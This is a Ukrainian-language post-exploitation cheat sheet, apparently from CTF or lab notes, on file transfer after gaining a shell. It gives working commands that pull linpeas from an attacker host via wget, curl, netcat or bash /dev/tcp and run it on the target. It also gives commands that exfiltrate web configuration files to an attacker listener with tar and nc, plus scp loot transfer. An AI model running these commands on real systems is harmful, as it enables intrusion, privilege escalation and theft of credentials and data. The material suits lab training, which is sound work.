# Workflow: File Transfer

**Для чого:** залити інструмент (linpeas, pspy, chisel) на ціль або забрати файл на локальну машину.
**Коли:** є shell і потрібно більше інструментів.
**На цілі немає інтернету** — усе качається з локальної машини через VPN.
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [netcat/socat](../03-cheatsheets/netcat-socat.md) · [pivoting](pivoting-portforward.md)

---

## Напрям: локальна машина → ціль

### HTTP (найнадійніше)
```bash
# на локальній машині (у каталозі з linpeas.sh тощо):
python3 -m http.server 8000
# на ЦІЛІ (VPN-адреса локальної машини):
wget http://10.8.N.x:8000/linpeas.sh -O /tmp/lp.sh      # або:
curl http://10.8.N.x:8000/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh
```
Запис у `/tmp` або `/dev/shm` (точно writable).

### Якщо нема wget/curl
```bash
# netcat
# локально: nc -lvnp 9001 < linpeas.sh
# ціль:     nc 10.8.N.x 9001 > /tmp/lp.sh
# bash /dev/tcp
exec 3<>/dev/tcp/10.8.N.x/8000; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r" >&3; cat <&3 > /tmp/lp.sh
# base64 вручну (малі файли): base64 на локальній → на цілі: echo '<b64>' | base64 -d > file
```

## Напрям: ціль → локальна машина (забрати файл/дамп)
```bash
# локально приймає:
nc -lvnp 9002 > loot.tar
# ціль відправляє:
tar czf - /var/www/config* 2>/dev/null | nc 10.8.N.x 9002
```

## scp (коли є SSH-доступ)
```bash
scp linpeas.sh user@$TARGET:/tmp/
scp user@$TARGET:/home/user/loot.zip .
# SSH зависає / файли не йдуть → MTU: у VPN-конфігу 1380 → 1280, перепідключення
```

## Інтерпретація/пастки
- Нічого не прийшло → listener не на VPN-інтерфейсі, або payload має localhost замість `10.8.N.x`.
- `Permission denied` при записі → `/tmp` чи `/dev/shm`.
- Великі передачі рвуться → MTU 1280 ([vpn](../00-setup/vpn-wireguard.md)).

## Що саме заливати (мінімум)
`linpeas.sh` (enum), `pspy64` (процеси/крон без рута), `chisel` (пивотинг) — підготувати офлайн, [pre-game-checklist](../00-setup/pre-game-checklist.md).
